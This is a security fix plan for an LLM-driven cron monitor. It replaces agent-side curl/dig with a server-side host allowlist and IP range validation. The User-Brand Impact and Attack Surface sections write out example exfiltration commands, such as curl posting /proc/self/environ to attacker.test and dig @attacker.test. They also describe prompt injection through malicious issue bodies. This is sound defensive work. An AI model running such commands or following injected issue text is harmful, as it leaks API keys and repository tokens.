---
title: "fix: SSRF hardening for cron-follow-through-monitor via Set.has() allowlist"
type: fix
date: 2026-05-26
lane: single-domain
brand_survival_threshold: single-user incident
requires_cpo_signoff: true
deepened: 2026-05-26
---

# fix: SSRF hardening for cron-follow-through-monitor via Set.has() allowlist

## Enhancement Summary

**Deepened on:** 2026-05-26
**Sections enhanced:** 7
**Research agents used:** ipaddr.js API analysis, URL parser edge-case probing, DNS API verification, follow-through corpus analysis, precedent-diff (validate-origin.ts)

### Key Improvements

1. **IPv4-mapped IPv6 handling** -- use `ipaddr.process()` (not `ipaddr.parse()`) to automatically unwrap `::ffff:x.x.x.x` to its IPv4 equivalent before range classification, eliminating a class of bypass.
2. **URL parser normalization** -- `new URL()` already normalizes numeric IP forms (`0x7f000001` -> `127.0.0.1`, `2130706433` -> `127.0.0.1`), so the allowlist check on `url.hostname` catches these without additional code.
3. **Predicate type coverage gap** -- production follow-through corpus includes `api-curl`, `http-headers`, `cli`, `auto` types beyond the plan's `http-200`/`dns-txt`/`dns-a`. These must be treated as `manual` (no server-side execution) in the validator.
4. **YAML parser reuse** -- `js-yaml` and `yaml` are both available transitively in `apps/web-platform/node_modules`; no new YAML dependency needed.
5. **IPv6 hostname bracket stripping** -- `new URL("https://[::1]/").hostname` returns `[::1]` (with brackets); `ipaddr.parse()` requires the un-bracketed form `::1`.

### New Considerations Discovered

- The `ipaddr.js` range taxonomy has 10 IPv4 range names and 20 IPv6 range names; only `"unicast"` is public/routable. The `isPublicIp()` function should allowlist `"unicast"` rather than denylist the ~28 other ranges.
- `dns.lookup()` uses the OS resolver (getaddrinfo), which matches Node.js `fetch()` resolution behavior -- this is the correct choice for TOCTOU mitigation (both resolve through the same path). `dns.resolve4()` uses DNS protocol directly and would create a resolution mismatch.

## Overview

Implement server-side URL validation in `cron-follow-through-monitor.ts` BEFORE
the LLM agent runs, closing the SSRF gap documented in issue #4068 (deferred
from TR9 PR-2 #4063). The current dual-defense (Layer 1: in-prompt guard; Layer
2: `buildSpawnEnv()` env-allowlist) relies on the LLM faithfully obeying the
prompt's HTTPS-and-non-RFC1918 guard -- which is bypassable via prompt injection,
DNS rebinding, URL-parser inconsistencies, IPv6, URL-userinfo abuse, percent-
encoded forms, and `dig`-based DNS exfil (all 7 gaps enumerated in #4068's body).

The fix adds **Layer 3 (mechanical, server-side)**: a `validatePredicateUrls()`
function that:

1. Fetches open follow-through issues via `gh issue list`.
2. Parses each issue's YAML verification block to extract `type` + `url` / `domain`.
3. For `http-200` predicates: resolves the URL hostname via `dns.lookup()`,
   validates the resolved IP is public using `ipaddr.js`, and validates the
   hostname against a hardcoded `Set<string>` of permitted hosts.
4. For `dns-txt` / `dns-a` predicates: validates the domain against the same
   host allowlist.
5. Passes ONLY the validated predicate set into the agent prompt.
6. Removes `Bash(curl:*)` and `Bash(dig:*)` from `--allowedTools` -- the agent
   no longer needs network verbs because server-side `fetch()` executes the
   HTTP predicate and `dns.resolve()` executes the DNS predicate.

## Problem Statement / Motivation

The current SSRF defense is dual-layered (learning
`2026-05-19-llm-bash-allowlist-network-verbs-dual-defense-and-cross-reconcile.md`):

- **Layer 1** (in-prompt): LLM-policed HTTPS-and-non-RFC1918 guard. Bypassable
  via prompt injection, IPv6 (`::1`, `fe80::`, `fc00::`, `::ffff:127.0.0.1`),
  cloud metadata hostnames (`metadata.google.internal`), URL-userinfo forms,
  DNS rebinding, percent-encoded IPs, and numeric IP forms.
- **Layer 2** (mechanical): `buildSpawnEnv()` limits subprocess env to 5 vars.
  Caps blast radius but does NOT prevent exfil of `ANTHROPIC_API_KEY` + `GH_TOKEN`.

Neither layer prevents the agent from being instructed (via prompt injection
through a malicious follow-through issue body) to `curl` internal services or
`dig @attacker.test` for DNS-based exfil. The `Bash(curl:*)` and `Bash(dig:*)`
entries in `--allowedTools` are the widest attack surface on this function.

Learning `2026-03-20-open-redirect-allowlist-validation.md` established that
`Set.has()` exact-match against a hardcoded allowlist is strictly superior to
regex, URL parsing, or substring checks for URL validation -- zero bypass
surface, fail-closed by construction.

## Proposed Solution

**Architecture: server-side predicate execution replaces agent-side execution.**

Instead of the agent running `curl`/`dig` inside `Bash()`, the server resolves
and executes predicates BEFORE the agent runs. The agent receives a pre-validated
summary of predicate results and acts on state transitions only (commenting,
labeling, closing). This eliminates the SSRF surface entirely -- the agent has
no network verbs in its allowlist.

### Key Design Decisions

1. **`ipaddr.js` for IP range classification** (new dependency, zero deps,
   MIT, 37 versions, well-maintained, v2.4.0). `node:net.isIP()` identifies
   address family but cannot classify ranges (loopback, private, link-local,
   etc.). `ipaddr.js` provides `.range()` which returns a classification
   string. The complete taxonomy (verified from source):
   - **IPv4 ranges:** `unspecified`, `broadcast`, `multicast`, `linkLocal`,
     `loopback`, `carrierGradeNat`, `private`, `reserved`, `as112`, `amt`,
     and `unicast` (the default/public range).
   - **IPv6 ranges:** `unspecified`, `linkLocal`, `multicast`, `loopback`,
     `uniqueLocal`, `ipv4Mapped`, `deprecatedSiteLocal`, `discard`,
     `rfc6145`, `rfc6052`, `6to4`, `teredo`, `benchmarking`, `amt`,
     `as112v6`, `deprecatedOrchid`, `orchid2`,
     `droneRemoteIdProtocolEntityTags`, `segmentRouting`, `reserved`,
     and `unicast` (the default/public range).
   The `isPublicIp()` function should **allowlist `"unicast"` only** rather
   than denylist the ~28 non-public ranges -- this is fail-closed against
   any future range additions to ipaddr.js.

   **Critical: use `ipaddr.process()` instead of `ipaddr.parse()`** to
   automatically unwrap IPv4-mapped IPv6 addresses (`::ffff:10.0.0.1` ->
   `10.0.0.1`) before range classification. Without `process()`,
   `ipaddr.parse("::ffff:10.0.0.1").range()` returns `"ipv4Mapped"` (an
   IPv6 range name, not `"private"`), which the allowlist-`"unicast"` check
   would correctly reject -- but `process()` is more explicit and produces
   the correct IPv4 range name (`"private"`) for logging/debugging.

2. **Hardcoded `Set<string>` of permitted hosts** -- not regex, not substring,
   not configurable at runtime. Adding a new host requires a code change +
   review + deploy. This is intentional: the follow-through corpus is small
   (~8 active issues, max ~10 per re-evaluation criterion) and changes
   infrequently. The hosts are derived from the current production corpus:
   - `app.soleur.ai` (health endpoint checks)
   - `api.github.com` (ruleset / workflow-run checks)
   - `api.doppler.com` (secret-presence checks)

3. **DNS resolution at validation time via `dns.lookup()`** -- uses the OS
   resolver (getaddrinfo), which is the SAME resolution path Node.js
   `fetch()` uses internally. This minimizes the TOCTOU window: the IP
   validated by `isPublicIp()` is the same IP `fetch()` will connect to
   (absent DNS rebinding with sub-second TTL between the two calls).
   `dns.resolve4()` would use DNS protocol directly and create a resolution
   mismatch -- the OS resolver honors `/etc/hosts` and nsswitch.conf, while
   `dns.resolve4()` bypasses them. For `dns-txt`/`dns-a` predicates, the
   domain is validated against the allowlist without IP resolution (the
   server-side `dns.resolveTxt()`/`dns.resolve4()` calls replace `dig`).

4. **Server-side `fetch()` for http-200 predicates** -- replaces `curl`.
   Uses `AbortSignal.timeout(10_000)` to bound request duration. Only
   checks HTTP status code (200 = pass). No body parsing, no redirect
   following (`redirect: "error"`).

5. **Server-side `dns.resolve()` for dns-txt/dns-a predicates** -- replaces
   `dig`. Uses `dns/promises` with a 10s timeout. Compares resolved values
   against the `expected` field from the YAML predicate.

6. **Prompt restructuring** -- the agent prompt drops the `curl`/`dig`
   instructions (step 3c) and receives a `## Pre-Validated Predicate Results`
   block injected at runtime. The agent acts on state transitions only.

### Research Insights (Deepen-Plan)

**URL Parser Normalization (verified empirically):**

`new URL()` normalizes several bypass vectors that the plan must NOT
re-implement:

- Numeric IPv4 forms: `https://0x7f000001/` -> `hostname: "127.0.0.1"`
- Decimal IPv4 forms: `https://2130706433/` -> `hostname: "127.0.0.1"`
- IPv6 bracket wrapping: `https://[::1]/` -> `hostname: "[::1]"` (brackets
  preserved -- must strip before `ipaddr.parse()`)
- Userinfo extraction: `https://10.0.0.1@host/` -> `username: "10.0.0.1"`
  (hostname is `host`, NOT `10.0.0.1`)

The validator should: (a) reject any URL where `url.username !== ""` or
`url.password !== ""` (userinfo abuse), (b) strip brackets from
`url.hostname` for IPv6 before passing to `ipaddr`, (c) rely on the URL
parser's numeric-to-dotted normalization rather than re-implementing it.

**YAML Parsing (no new dependency needed):**

Both `js-yaml` (CommonJS) and `yaml` (ESM) are available transitively in
`apps/web-platform/node_modules`. The YAML blocks in follow-through issues
are trivially simple (3-4 key-value pairs, no nested structures), so either
library works. Prefer `yaml` (ESM, newer, maintained by the YAML WG) over
`js-yaml` (CommonJS, legacy). Alternative: regex-based extraction for the
3 fields (`type`, `url`/`domain`, `expected`/`sla_business_days`) would
avoid the import entirely -- acceptable given the fixed schema.

**Predicate Type Coverage (corpus analysis):**

Production follow-through corpus (200 issues scanned):

| Type | Count | Server-side execution? |
|------|-------|----------------------|
| `manual` | 162 | No (SLA tracking only) |
| `http-200` | 5 | Yes (fetch + status check) |
| `api-curl` | 3 | No -- requires auth headers from Doppler |
| `http-headers` | 1 | No -- complex header matching |
| `cli` | 1 | No -- arbitrary command execution |
| `auto` | 1 | No -- ambiguous semantics |

Only `http-200`, `dns-txt`, and `dns-a` types are candidates for
server-side execution. All other types (`manual`, `api-curl`,
`http-headers`, `cli`, `auto`) MUST be treated as manual (no URL
validation, no server-side execution, SLA tracking only). The
`_predicate-validator.ts` module must handle these gracefully by
returning `{ type: "manual", skipped: true }`.

**`api-curl` type (deferred scope):** `api-curl` predicates carry
`headers_from_doppler: { Authorization: <DOPPLER_KEY> }` fields that
require Doppler secret resolution at runtime. Server-side execution of
`api-curl` is a separate scope (requires Doppler client integration in
the Inngest function). Defer to a follow-up issue if demand grows beyond
3 active `api-curl` predicates.

**Precedent: `validate-origin.ts` Set Pattern (verified at
`apps/web-platform/lib/auth/validate-origin.ts:9`):**

```typescript
const PRODUCTION_ORIGINS = new Set(["https://app.soleur.ai"]);
```

The codebase precedent uses `new Set([...])` with inline string literals,
`.has()` with `.toLowerCase()` normalization, and a fail-closed default.
The `_predicate-validator.ts` module should follow this exact pattern.

## User-Brand Impact

- **If this lands broken, the user experiences:** follow-through issues not
  being auto-verified or auto-closed (monitoring goes dark). The agent would
  skip predicates it cannot validate, leaving issues open past SLA.
- **If this leaks, the user's data/workflow is exposed via:** without this
  fix, a malicious follow-through issue body could instruct the agent to
  `curl -d @/proc/self/environ https://attacker.test` and exfiltrate
  `ANTHROPIC_API_KEY` + `GH_TOKEN` from the subprocess environment. This
  is the attack vector #4068 was filed to close.
- **Brand-survival threshold:** `single-user incident` -- a single compromised
  `ANTHROPIC_API_KEY` or `GH_TOKEN` would require immediate rotation across
  all infrastructure, and the `GH_TOKEN` grants write access to the repository.

## Attack Surface Enumeration

All code paths that touch the SSRF surface being fixed:

1. **`Bash(curl:*)` in `--allowedTools`** -- the agent can run any `curl`
   invocation including `-d @/proc/self/environ`, `-F file=@/path`,
   `-X DELETE -H "Authorization: bearer $GH_TOKEN"`. **Fixed by removal.**
2. **`Bash(dig:*)` in `--allowedTools`** -- the agent can run `dig @attacker.test`
   for DNS-based exfil, or resolve internal hostnames. **Fixed by removal.**
3. **In-prompt HTTPS-and-non-RFC1918 guard (Layer 1)** -- LLM-policed, bypassable
   via all 7 vectors in #4068. **Downgraded from load-bearing to defense-in-depth;
   Layer 3 becomes load-bearing.**
4. **`buildSpawnEnv()` (Layer 2)** -- mechanical env-var allowlist. **Unchanged;
   remains as blast-radius cap for any remaining Bash tools.**
5. **Issue body YAML parsing** -- the agent parses untrusted YAML from issue
   bodies. **Moved server-side; agent no longer parses YAML directly.**

### Unchecked paths (justification)

- **`Bash(gh issue list:*)`, `Bash(gh issue view:*)`, etc.** -- these are
  GitHub API calls authenticated with `GH_TOKEN`. The agent needs these to
  read issue state, post comments, and close issues. The `GH_TOKEN` scope
  should be minimized at the operator level (fine-grained PAT, repo-scoped).
  These are NOT SSRF vectors -- they target `api.github.com` only.
- **`Read`, `Glob`, `Grep`** -- filesystem-only tools. No network access.

## Observability

```yaml
liveness_signal:
  what: Sentry cron monitor "scheduled-follow-through" heartbeat
  cadence: per-run (weekday 09:00 UTC via Inngest cron)
  alert_target: Sentry issue alert -> operator email
  configured_in: apps/web-platform/infra/sentry/cron-monitors.tf

error_reporting:
  destination: Sentry web-platform via reportSilentFallback
  fail_loud: >
    New log line: "predicate-validation: N of M predicates rejected" at
    logger.warn level. Sentry heartbeat status=error if claude-eval
    exits non-zero.

failure_modes:
  - mode: DNS resolution timeout during predicate validation
    detection: reportSilentFallback with feature "predicate-validation"
    alert_route: Sentry issue -> operator email
  - mode: All predicates rejected (empty validated set)
    detection: logger.warn "predicate-validation: 0 of N predicates passed"
    alert_route: Sentry via reportSilentFallback (empty-validated-set)
  - mode: ipaddr.js parse failure on resolved IP
    detection: try/catch in validateResolvedIp, reportSilentFallback
    alert_route: Sentry issue
  - mode: Allowlist too restrictive (legitimate host not in Set)
    detection: Predicate marked "rejected" in validation log; follow-through issue stays open past SLA
    alert_route: needs-attention label on the follow-through issue (existing Guard B)

logs:
  where: journalctl -u inngest.service (Hetzner node)
  retention: 30 days (systemd journal default)

discoverability_test:
  command: >
    curl -s https://app.soleur.ai/api/inngest 2>/dev/null | head -c 200
  expected_output: Inngest function registration response (confirms inngest endpoint is live)
```

## Acceptance Criteria

### Pre-merge (PR)

- [ ] AC1: New file `apps/web-platform/server/inngest/functions/_predicate-validator.ts`
  exports `validatePredicateUrls()` and `ALLOWED_PREDICATE_HOSTS` (a `Set<string>`).
- [ ] AC2: `ALLOWED_PREDICATE_HOSTS` contains exactly: `app.soleur.ai`,
  `api.github.com`, `api.doppler.com`. Verified by:
  `grep -c "ALLOWED_PREDICATE_HOSTS" apps/web-platform/server/inngest/functions/_predicate-validator.ts`
  returns 1 (exported const definition).
- [ ] AC3: `isPublicIp()` uses `ipaddr.process(ip).range() === "unicast"` --
  allowlisting the single public range rather than denylisting ~28 non-public
  ranges. `ipaddr.process()` unwraps IPv4-mapped IPv6 before classification.
  Verified by test: `isPublicIp("8.8.8.8")` -> true,
  `isPublicIp("10.0.0.1")` -> false, `isPublicIp("::ffff:127.0.0.1")` -> false.
- [ ] AC4: `validatePredicateUrls()` rejects URLs whose hostname is not in
  `ALLOWED_PREDICATE_HOSTS` (Set.has exact-match, case-insensitive via
  `.toLowerCase()`).
- [ ] AC5: `cron-follow-through-monitor.ts` `CLAUDE_CODE_FLAGS` no longer
  contains `Bash(curl:*)` or `Bash(dig:*)`. Verified by:
  `grep -c 'Bash(curl' apps/web-platform/server/inngest/functions/cron-follow-through-monitor.ts`
  returns 0.
- [ ] AC6: `cron-follow-through-monitor.ts` adds a new step.run
  `"validate-predicates"` that calls `validatePredicateUrls()` BEFORE
  `"claude-eval"`. The step returns the validated predicate results.
- [ ] AC7: The `FOLLOW_THROUGH_PROMPT` is restructured: step 3c (curl/dig
  execution) is replaced with a reference to the injected
  `## Pre-Validated Predicate Results` block. The agent acts on pre-validated
  results, not raw issue body URLs.
- [ ] AC8: Server-side `fetch()` for http-200 predicates uses
  `redirect: "error"` (no redirect following) and
  `AbortSignal.timeout(10_000)` (10s timeout).
- [ ] AC9: Server-side `dns.resolve()` for dns-txt/dns-a predicates uses
  a 10s timeout.
- [ ] AC10: `ipaddr.js` is added to `apps/web-platform/package.json`
  dependencies. Verified by:
  `grep '"ipaddr.js"' apps/web-platform/package.json` returns a line.
- [ ] AC11: Test file
  `apps/web-platform/test/server/inngest/predicate-validator.test.ts` exists
  with tests covering: (a) public host in allowlist passes, (b) public host
  NOT in allowlist fails, (c) private IPv4 (10.x, 172.16.x, 192.168.x) fails,
  (d) loopback (127.0.0.1, ::1) fails, (e) link-local (169.254.x.x, fe80::)
  fails, (f) IPv4-mapped IPv6 (::ffff:127.0.0.1) fails, (g) URL-userinfo
  forms rejected, (h) non-HTTPS scheme rejected.
- [ ] AC12: Existing test file
  `apps/web-platform/test/server/inngest/cron-follow-through-monitor.test.ts`
  updated: T1 spawn call no longer includes `Bash(curl:*)` or `Bash(dig:*)`
  in args; new assertion that step.calls includes `"validate-predicates"`.
- [ ] AC13: `_predicate-validator.ts` handles all predicate types from the
  production corpus: `http-200` (validate + execute), `dns-txt` (validate +
  execute), `dns-a` (validate + execute), and `manual`/`api-curl`/
  `http-headers`/`cli`/`auto`/unknown (pass through as manual). Verified by
  test: `parsePredicateYaml()` on a `type: api-curl` block returns
  `{ type: "api-curl", ... }` and `validateAndExecutePredicates()` treats
  it as `{ skipped: true, reason: "unsupported type" }`.
- [ ] AC14: `npm test` passes in `apps/web-platform/` (vitest, not bun test).
  Note: `bunfig.toml` blocks bun test discovery (`pathIgnorePatterns = ["**"]`
  per #1469); use `cd apps/web-platform && ./node_modules/.bin/vitest run`.

### Post-merge (operator)

- [ ] AC15: After first weekday 09:00 UTC cron fire post-deploy, verify
  Sentry monitor `scheduled-follow-through` received a heartbeat.
  `Automation: inngest send cron/follow-through-monitor.manual-trigger`
  can trigger a manual run for verification.

## Test Scenarios

- Given a follow-through issue with `type: http-200` and
  `url: https://app.soleur.ai/api/health`, when `validatePredicateUrls()` runs,
  then the URL passes validation (host in allowlist, resolved IP is public).
- Given a follow-through issue with `type: http-200` and
  `url: https://evil.test/steal`, when `validatePredicateUrls()` runs,
  then the URL is rejected (host not in allowlist).
- Given a follow-through issue with `type: http-200` and
  `url: http://app.soleur.ai/api/health` (HTTP not HTTPS), when
  `validatePredicateUrls()` runs, then the URL is rejected (non-HTTPS scheme).
- Given a follow-through issue with `type: http-200` and
  `url: https://127.0.0.1/steal`, when `validatePredicateUrls()` runs,
  then the URL is rejected (loopback IP).
- Given a follow-through issue with `type: http-200` and
  `url: https://10.0.0.1@app.soleur.ai/`, when `validatePredicateUrls()` runs,
  then the URL is rejected (URL-userinfo abuse; hostname parses as
  `app.soleur.ai` but userinfo contains private IP -- reject any URL with
  userinfo).
- Given a follow-through issue with `type: dns-txt` and
  `domain: soleur.ai`, when the domain is NOT in `ALLOWED_PREDICATE_HOSTS`,
  then the predicate is rejected.
- Given a follow-through issue with missing/malformed YAML, when
  `validatePredicateUrls()` parses the issue body, then the issue is treated
  as `type: manual` (no URL validation needed, pass through).
- Given ALL predicate URLs are rejected, when the agent prompt is constructed,
  then the `## Pre-Validated Predicate Results` block shows all predicates as
  "REJECTED" and the agent skips them gracefully.

## Implementation Phases

### Phase 0: Preconditions

- [ ] Verify `ipaddr.js` API after Phase 1 install: run
  `cd apps/web-platform && node -e "const ip = require('ipaddr.js'); console.log(ip.process('::ffff:10.0.0.1').range())"`.
  Expected: `"private"` (process() unwraps IPv4-mapped, then range() classifies).
  Also verify: `ip.process('8.8.8.8').range()` -> `"unicast"`.
- [ ] Verify `node:dns/promises` is available (verified 2026-05-26):
  `dns.lookup("app.soleur.ai")` returns `{address: "<IP>", family: 4}`.
  `dns.resolve4`, `dns.resolveTxt` both available.
- [ ] Verify `new URL()` edge cases (verified 2026-05-26):
  - `new URL("https://user:pass@host/").username` -> `"user"` (detect userinfo)
  - `new URL("https://0x7f000001/").hostname` -> `"127.0.0.1"` (numeric normalized)
  - `new URL("https://[::1]/").hostname` -> `"[::1]"` (brackets preserved)
- [ ] Verify YAML parser availability: `require("yaml")` in
  `apps/web-platform/node_modules` (available transitively, no new dep needed).

### Phase 1: Add `ipaddr.js` dependency

- [ ] Add `ipaddr.js` to `apps/web-platform/package.json` dependencies.
- [ ] Run `npm install` in `apps/web-platform/`.

### Phase 2: Create `_predicate-validator.ts`

New file: `apps/web-platform/server/inngest/functions/_predicate-validator.ts`

Exports:
- `ALLOWED_PREDICATE_HOSTS: Set<string>` -- the hardcoded allowlist
- `isPublicIp(ip: string): boolean` -- uses `ipaddr.process()` + `.range() === "unicast"`
- `validatePredicateUrl(url: string): Promise<{ valid: boolean; reason?: string }>`
- `executeHttpPredicate(url: string): Promise<{ passed: boolean; statusCode: number | null; error?: string }>`
- `executeDnsPredicate(type: "dns-txt" | "dns-a", domain: string, expected: string): Promise<{ passed: boolean; result?: string; error?: string }>`
- `parsePredicateYaml(issueBody: string): ParsedPredicate | null`
- `formatPredicateResults(results: ValidatedPredicate[]): string`
- `validateAndExecutePredicates(issues: ParsedFollowThroughIssue[]): Promise<ValidatedPredicate[]>`

The module follows the `resolve-origin.ts` pattern: pure functions with no
framework dependencies, testable with vitest directly.

#### Research Insights: `isPublicIp()` Implementation

```typescript
import ipaddr from "ipaddr.js";

// Allowlist "unicast" only -- fail-closed against future ipaddr.js range additions.
// ipaddr.process() unwraps IPv4-mapped IPv6 (::ffff:x.x.x.x -> x.x.x.x)
// BEFORE range classification, producing the correct IPv4 range name.
export function isPublicIp(ip: string): boolean {
  try {
    const addr = ipaddr.process(ip);
    return addr.range() === "unicast";
  } catch {
    return false; // unparseable IP is never public
  }
}
```

#### Research Insights: `validatePredicateUrl()` Implementation

```typescript
import { lookup } from "node:dns/promises";

export async function validatePredicateUrl(
  rawUrl: string,
): Promise<{ valid: boolean; reason?: string }> {
  // 1. Parse URL (catches malformed URLs, normalizes numeric IPs)
  let parsed: URL;
  try {
    parsed = new URL(rawUrl);
  } catch {
    return { valid: false, reason: "malformed URL" };
  }

  // 2. HTTPS-only
  if (parsed.protocol !== "https:") {
    return { valid: false, reason: `non-HTTPS scheme: ${parsed.protocol}` };
  }

  // 3. Reject userinfo (URL-userinfo abuse vector)
  if (parsed.username || parsed.password) {
    return { valid: false, reason: "URL contains userinfo" };
  }

  // 4. Strip IPv6 brackets for hostname comparison + ipaddr parsing
  const hostname = parsed.hostname.replace(/^\[|\]$/g, "").toLowerCase();

  // 5. Host allowlist (Set.has exact-match)
  if (!ALLOWED_PREDICATE_HOSTS.has(hostname)) {
    return { valid: false, reason: `host not in allowlist: ${hostname}` };
  }

  // 6. DNS resolution + IP range check
  try {
    const { address } = await lookup(hostname);
    if (!isPublicIp(address)) {
      return { valid: false, reason: `resolved to non-public IP: ${address}` };
    }
  } catch (err) {
    return { valid: false, reason: `DNS lookup failed: ${(err as Error).message}` };
  }

  return { valid: true };
}
```

#### Research Insights: Predicate Type Handling

The `parsePredicateYaml()` function must handle the following types from
the production corpus:

- `http-200` -> validate URL, execute via `fetch()`, return status
- `dns-txt` -> validate domain, execute via `dns.resolveTxt()`, check expected
- `dns-a` -> validate domain, execute via `dns.resolve4()`, check expected
- `manual` -> pass through (SLA tracking only, no URL to validate)
- `api-curl` -> treat as manual (requires Doppler auth headers, deferred)
- `http-headers` -> treat as manual (complex header matching, deferred)
- `cli` -> treat as manual (arbitrary command, never server-side)
- `auto` -> treat as manual (ambiguous semantics)
- Unknown/missing -> treat as manual (fail-safe per existing prompt behavior)

### Phase 3: Update `cron-follow-through-monitor.ts`

- [ ] Add `"validate-predicates"` step.run BEFORE `"claude-eval"`.
- [ ] In validate-predicates: fetch open follow-through issues via `gh issue list`
  (using `spawn("gh", ["issue", "list", ...])` same pattern as ensure-labels),
  parse YAML predicates, call `validateAndExecutePredicates()`.
- [ ] Update `CLAUDE_CODE_FLAGS`: remove `Bash(curl:*)` and `Bash(dig:*)`.
- [ ] Update `FOLLOW_THROUGH_PROMPT`: remove step 3c (curl/dig instructions),
  add reference to `## Pre-Validated Predicate Results` block.
- [ ] Inject validated predicate results into the prompt at runtime by
  appending the results block to `FOLLOW_THROUGH_PROMPT`.
- [ ] Update file-header SSRF comment: change from "DUAL" to "TRIPLE" and
  document Layer 3 as the new load-bearing defense.

### Phase 4: Update existing tests

- [ ] Update `cron-follow-through-monitor.test.ts`:
  - T1: verify `Bash(curl:*)` and `Bash(dig:*)` absent from spawn args.
  - T1: verify step.calls includes `"validate-predicates"` before `"claude-eval"`.
  - Mock the gh issue list spawn in the validate-predicates step.

### Phase 5: New tests for `_predicate-validator.ts`

New file: `apps/web-platform/test/server/inngest/predicate-validator.test.ts`

Test cases (mock `dns.lookup`, `fetch`, `dns.resolve`):
- Public host in allowlist + public IP -> valid
- Public host NOT in allowlist -> invalid
- Private IPv4 ranges (10.x, 172.16.x, 192.168.x) -> invalid
- Loopback (127.0.0.1, ::1) -> invalid
- Link-local (169.254.x.x, fe80::) -> invalid
- IPv4-mapped IPv6 (::ffff:127.0.0.1) -> invalid
- IPv6 unique-local (fc00::) -> invalid
- URL with userinfo -> invalid
- Non-HTTPS URL -> invalid
- DNS lookup timeout -> graceful failure with error
- fetch timeout -> graceful failure with error
- http-200 predicate: 200 response -> passed
- http-200 predicate: non-200 response -> not passed
- dns-txt predicate: expected value found -> passed
- dns-a predicate: expected IP found -> passed
- Malformed YAML -> treated as manual type

## Files to Edit

- `apps/web-platform/package.json` -- add `ipaddr.js` dependency
- `apps/web-platform/server/inngest/functions/cron-follow-through-monitor.ts` -- add validate-predicates step, update prompt, update CLAUDE_CODE_FLAGS
- `apps/web-platform/test/server/inngest/cron-follow-through-monitor.test.ts` -- update assertions

## Files to Create

- `apps/web-platform/server/inngest/functions/_predicate-validator.ts` -- new module
- `apps/web-platform/test/server/inngest/predicate-validator.test.ts` -- new tests

## Open Code-Review Overlap

None

## Risks & Mitigations

| Risk | Mitigation |
|------|-----------|
| `ipaddr.js` adds a new dependency | Zero transitive deps, MIT, 37 versions, well-maintained (v2.4.0). Alternative (rolling our own IPv6 range classifier for 10 IPv4 + 20 IPv6 named ranges) is error-prone per #4068 issue body. |
| DNS resolution at validation time may differ from fetch execution time (TOCTOU) | Minimized: both `dns.lookup()` and `fetch()` use the OS resolver (getaddrinfo). DNS rebinding with sub-second TTL between the two calls is theoretical at follow-through corpus scale (~8 issues). The alternative (no resolution) leaves IPv6 and numeric IP forms unaddressed. |
| Legitimate follow-through host not in allowlist | Fail-safe: issue stays open past SLA, Guard B fires needs-attention label, operator adds host to allowlist in a code change. Better than fail-open (SSRF). |
| Server-side fetch may behave differently from curl (redirects, TLS, SNI) | `redirect: "error"` matches the monitoring intent (status check, not content fetch). TLS/SNI handled by Node.js built-in. |
| Removing curl/dig from agent breaks manual-type predicates | Manual-type predicates have no automated check (prompt step 3c already says "No automated check. Only track SLA."). No curl/dig needed. |
| `api-curl` predicates (3 in corpus) not server-side executed | These require Doppler auth headers -- server-side execution would need Doppler client integration. Treated as manual; deferred to follow-up if demand grows. Guard B SLA tracking still applies. |
| `ipaddr.process()` on non-IP hostnames throws | Hostnames are resolved via `dns.lookup()` first; only the resolved IP string (always valid IPv4/IPv6) is passed to `ipaddr.process()`. Hostnames never reach ipaddr directly. |
| IPv6 brackets in `url.hostname` break `ipaddr.parse()` | `url.hostname` returns `[::1]` for IPv6 -- strip brackets before ipaddr: `hostname.replace(/^\[|\]$/g, "")`. Covered by test case. |

## Alternative Approaches Considered

| Approach | Why rejected |
|----------|-------------|
| Keep agent-side curl/dig with tightened prompt | Prompt-based guards are bypassable via prompt injection. This is the current state and the reason #4068 was filed. |
| Regex-based URL validation (no allowlist) | Regex has bypass surface (encoding, numeric forms, IPv6). Set.has() is strictly superior per learning `2026-03-20-open-redirect-allowlist-validation.md`. |
| Runtime-configurable allowlist (env var / config file) | Over-engineering for ~3 hosts that change rarely. Hardcoded Set is simpler, auditable, fail-closed. |
| Use `node:net` only (no ipaddr.js) | `node:net.isIP()` identifies family but cannot classify ranges. Would require manually implementing IPv4/IPv6 range checks for loopback, private, link-local, unique-local, carrier-grade NAT, IPv4-mapped IPv6, 6to4, Teredo. Error-prone and incomplete. |

## References

- Issue: #4068 (SSRF hardening deferred scope-out)
- Parent epic: #3244
- Umbrella: #3948 (TR9 group-(c) agent-loop crons)
- Learning: `knowledge-base/project/learnings/2026-03-20-open-redirect-allowlist-validation.md`
- Learning: `knowledge-base/project/learnings/2026-05-19-llm-bash-allowlist-network-verbs-dual-defense-and-cross-reconcile.md`
- Learning: `knowledge-base/project/learnings/2026-05-21-follow-through-template-host-drift-and-qa-spawned-feature.md`
- Reference implementation: `apps/web-platform/lib/auth/resolve-origin.ts` (Set.has pattern)
- Reference implementation: `apps/web-platform/lib/auth/validate-origin.ts` (getAllowedOrigins)

## Domain Review

**Domains relevant:** Engineering (CTO), Legal (CLO)

### Engineering (CTO)

**Status:** reviewed
**Assessment:** Security hardening of an existing LLM-driven cron function.
The Set.has() pattern has established precedent in the codebase
(`resolve-origin.ts`). The new dependency (`ipaddr.js`) is justified because
`node:net` cannot classify IP ranges. The architecture moves predicate
execution server-side, which is the correct direction for defense-in-depth.
No concerns.

### Legal (CLO)

**Status:** reviewed
**Assessment:** The fix closes a credential-exfiltration vector
(`ANTHROPIC_API_KEY` + `GH_TOKEN`) that would require breach notification
under GDPR Art. 33/34 if exploited. No new data processing activities
introduced. The server-side DNS resolution is ephemeral (not logged or
stored). No compliance gaps.

### Product/UX Gate

Not applicable -- no user-facing UI changes. Pure server-side security
hardening.

## Sharp Edges

- The `ALLOWED_PREDICATE_HOSTS` Set must be updated manually when new
  follow-through predicate hosts are needed. This is by design (fail-closed).
  If a new host is needed, the operator will see the follow-through issue
  stay open past SLA, Guard B will fire needs-attention, and the operator
  adds the host in a code PR.
- The `validate-predicates` step.run executes BEFORE `claude-eval`. If it
  fails (DNS timeout, gh CLI error), the function should still proceed to
  `claude-eval` with an empty validated set -- the agent will skip automated
  checks and treat all predicates as manual. This preserves the SLA-tracking
  behavior even when validation is degraded.
- Use `ipaddr.process()` NOT `ipaddr.parse()` for IP classification. The
  difference: `ipaddr.parse("::ffff:10.0.0.1").range()` returns `"ipv4Mapped"`
  (an IPv6 range, technically correct but unhelpful for logging); while
  `ipaddr.process("::ffff:10.0.0.1").range()` returns `"private"` (the IPv4
  classification after unwrapping). Both are rejected by the
  `range() === "unicast"` check, but `process()` produces correct IPv4
  range names for debugging/Sentry context.
- `new URL("https://[::1]/").hostname` returns `"[::1]"` (with brackets).
  The brackets must be stripped before passing to `ipaddr.process()` or
